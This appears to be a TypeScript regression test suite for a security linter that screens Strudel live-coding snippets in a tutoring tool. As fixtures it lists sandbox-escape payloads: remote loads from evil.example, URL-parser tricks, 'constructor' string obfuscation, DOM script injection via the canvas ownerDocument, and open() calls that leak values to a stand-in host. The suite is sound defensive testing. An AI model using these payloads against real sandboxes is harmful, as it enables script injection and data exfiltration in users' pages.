// Adversarial review of the safety profiles (contracts §11.3): routes that passed the lint before this
// review. Each row is the regression test of a gap that was closed.
import { describe, expect, test } from "bun:test";
import type { LintContext } from "@oak/content-kit";
import { lintBase, lintOak, lintStrict } from "./oak.ts";

const CARD: LintContext = {
  profile: "tutor-card",
  unlocked: new Set(),
  allowPreview: true,
  meter: "4/4",
  key: null,
};

const ids = (diags: { id: string }[]) => [...new Set(diags.map((d) => d.id))];

describe("remote sample loading", () => {
  test("base: a remote URL anywhere inside samples()/aliasBank() arguments is refused", () => {
    for (const code of [
      'samples({ bd: "https://evil.example/bd.wav" })',
      'samples({ bd: ["https://evil.example/bd.wav"] }, "/sounds/")',
      'samples("github:someone/samples")',
      'samples("\\\\\\\\evil.example/x.json")', // `\\host` is `//host` to a browser's URL parser
      'samples("\\u0001https://evil.example/x.json")', // leading C0 controls are stripped by URL parsing
      'samples("wss://evil.example/x")',
      'aliasBank("https://evil.example/alias.json")',
      "samples(`https://evil.example/x.json`)",
    ]) {
      expect([code, ids(lintBase(code))]).toEqual([code, ["lint.base.remote-samples"]]);
    }
  });

  test("base: local paths and the learner's own maps pass", () => {
    for (const code of [
      'samples("/sounds/v1/strudel.json")',
      'samples({ bd: "bd/kick.wav" }, "/sounds/v1/")',
    ])
      expect([code, lintBase(code)]).toEqual([code, []]);
  });

  test("strict: an argument the lint cannot read (a name, a concatenation, a call) is refused", () => {
    for (const code of [
      'const u = "https://evil.example/x.json"\nsamples(u)',
      'samples("ht" + "tps://evil.example/x.json")',
      'samples(["h", "ttps://evil.example"].join(""))',
      "samples({ bd: u })",
      "aliasBank(String.fromCharCode(104))",
    ]) {
      expect([code, ids(lintStrict(code))]).toEqual([
        code,
        expect.arrayContaining(["lint.strict.construct"]),
      ]);
    }
    expect(lintStrict('samples({ bd: ["bd/kick.wav", "bd/k2.wav"] }, "/sounds/v1/")')).toEqual([]);
  });

  test("sound pack v4: tables() (wavetables) is a loader like samples(): remote refused, local kept", () => {
    for (const code of [
      'tables("https://evil.example/wt.wav", 2048)',
      'tables("github:someone/wavetables")',
      'tables(["//evil.example/a.wav"], 2048, true)',
    ])
      expect([code, ids(lintBase(code))]).toEqual([code, ["lint.base.remote-samples"]]);
    expect(lintBase('tables("/sounds/v4/wavetables/wt_morph.wav", 2048)')).toEqual([]);
    expect(ids(lintStrict('const u = "https://evil.example/wt.wav"\ntables(u)'))).toEqual(
      expect.arrayContaining(["lint.strict.construct"]),
    );
    // The message names the call it is about.
    const [d] = lintBase('tables("https://evil.example/wt.wav")');
    expect(d?.message).toContain('`tables("https://evil.example/wt.wav")`');
    const [s] = lintBase('samples("github:someone/samples")');
    expect(s?.message).toContain('`samples("github:someone/samples")`');
  });
});

describe("strict: Strudel's registration functions", () => {
  test("every function that adds methods or globals to the realm is refused", () => {
    for (const name of [
      "register",
      "registerControl",
      "registerMultiControl",
      "createParam",
      "createParams",
    ]) {
      const code = `${name}("note")`;
      expect([code, ids(lintStrict(code))]).toEqual([code, ["lint.strict.construct"]]);
    }
  });
});

// review:security (Wave 7). In the page the strict profile is the only layer (the page keeps `Function` and every
// global), so it is an allowlist of the names code the learner did not type may read. Each row passed before.
describe("strict: the names code may read from outside itself", () => {
  const DOM = "lint.strict.construct";
  test("routes to the DOM, the window and Function that passed the strict profile are refused", () => {
    for (const code of [
      // A canvas context reaches the document; CSP allows a `data:` script, so this ran arbitrary JS.
      'const d = getDrawContext().canvas.ownerDocument\nconst e = d.createElement("script")\nconst a = e.setAttribute("src", "data:text/javascript,1")\n$: s("bd").fmap(v => d.body.append(e) && v)',
      // The same, lazily, only when the page plays it (the grader realm never runs the callback).
      '$: s("bd*4").onTrigger(h => getDrawContext().canvas.ownerDocument.body.append(h), false)',
      // `.onPaint` hands the callback a canvas context in the page.
      '$: note("c4").onPaint(ctx => ctx.canvas.ownerDocument)',
      'const w = getDrawContext().canvas.ownerDocument.defaultView\n$: s("bd").fmap(v => w.open("http://x.invalid/?" + v) && v)',
      // parseFractional looks its argument up in an object literal: "constructor" gives `Object`.
      'const O = parseFractional("con" + "structor")\n$: s("bd")',
      'const k = "con"\nconst O = fractionalArgs(x => x)(k + "structor")\n$: s("bd")',
      'const O = squeeze\nconst F = O.getOwnPropertyDescriptor(O.getPrototypeOf(id), "x").value\n$: s("bd")',
      // Window globals no list named.
      '$: s("bd").fmap(v => open("http://x.invalid/?" + v) && v)',
      '$: s("bd").fmap(v => opener && v)',
      '$: s("bd").fmap(v => alert(v))',
      '$: s("bd").fmap(v => history.back() && v)',
      '$: s("bd").fmap(v => getAudioContext().audioWorklet.addModule("data:text/javascript,1") && v)',
      // A local binding in one arrow does not make the name safe elsewhere.
      '(open => open)(1)\n$: s("bd").fmap(v => open("http://x.invalid/") && v)',
      // Strudel's own doors: a clock, the realm's registries, bytebeat compiling a string.
      'const c = getTime()\n$: s("bd")',
      '$: s("bd").bbexpr("t*(t>>5)")',
      'const r = voicingRegistry\n$: s("bd")',
    ]) {
      expect([code, ids(lintStrict(code))]).toEqual([code, expect.arrayContaining([DOM])]);
      const card = lintOak(code, { ...CARD, unlocked: new Set() }, []);
      expect([code, card.ok]).toEqual([code, false]);
    }
  });

  test('"con" + "structor" written as one static concatenation is refused by rule 3', () => {
    expect(ids(lintStrict('const k = "con" + "struc" + "tor"\n$: s("bd")'))).toContain(
      "lint.strict.reserved-string",
    );
    expect(ids(lintStrict('const k = "__pro" + "to__"\n$: s("bd")'))).toContain(
      "lint.strict.reserved-string",
    );
  });

  test("the reference shapes still pass: names the code binds, Strudel's scope, plain builtins", () => {
    for (const code of [
      'setcpm(90/4)\n$: note("c4 e4 g4 b4").s("piano")',
      'const chords = "<Dm7 G7 C^7>"\n$: chord(chords).voicing().s("piano").room(0.3)',
      '$: n("0 2 4 <6 7>").scale("C:major").s("sawtooth").lpf(sine.range(400, 2000).slow(4))',
      'const {a, b: [c]} = {a: 1, b: [2]}\n$: n(run(4).add(a + c)).scale("D:dorian").s("piano")',
      '$: s("bd*4").fmap(v => ({ ...v, gain: Math.min(1, 0.5 + Math.random() * 0) }))',
      'mel: stack(...[note("c4"), note("e4")])',
      '$: s("hh*8").gain(perlin.range(0.4, 0.8)).pianoroll()',
      'const lift = x => x.add(Number("12"))\n$: note("c3 g3").apply(lift).s("bass")',
    ]) {
      expect([code, lintStrict(code)]).toEqual([code, []]);
    }
  });
});
